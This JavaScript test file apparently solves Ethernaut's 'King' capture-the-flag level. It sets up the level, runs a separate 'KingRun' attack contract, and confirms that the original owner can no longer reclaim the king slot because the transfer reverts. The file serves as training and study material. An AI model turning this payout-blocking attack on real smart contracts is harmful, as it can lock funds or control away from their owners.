const { expect } = require("chai");
var tools = require("./tools");

describe("09King", function () {
  let player, levelOwner, levelContract, runContract;
  it("setup", async function () {
    [player, levelOwner, levelContract] = await tools.initLevel("King");
    //levelOwner先占领king
    //通过chrome控制台可以得到prize(转化为二进制后为：1000000000000000 wei)：await web3.eth.getStorageAt(instance,1)+"";
    await levelOwner.sendTransaction({
      to: levelContract.address,
      value: 1000000000000000,
    });
    runContract = await tools.deployContract("KingRun", player);
    //检查原始的owner和king
    expect(await levelContract.owner()).to.equal(levelOwner.address);
    expect(await levelContract._king()).to.equal(levelOwner.address);
  });

  it("attacks", async function () {
    await runContract.connect(player).run(levelContract.address, {
      value: 1000000000000000 + 1,
    });
  });

  it("check", async function () {
    //检查通过条件
    //1.king不再是levelOwner
    //2.levelOwner无法通过转账取回King
    expect(await levelContract._king()).to.equal(runContract.address);
    await expect(
      levelOwner.sendTransaction({
        to: levelContract.address,
        value: 1000,
      })
    ).to.be.reverted;
    expect(await levelContract._king()).to.not.equal(levelOwner.address);
  });
});
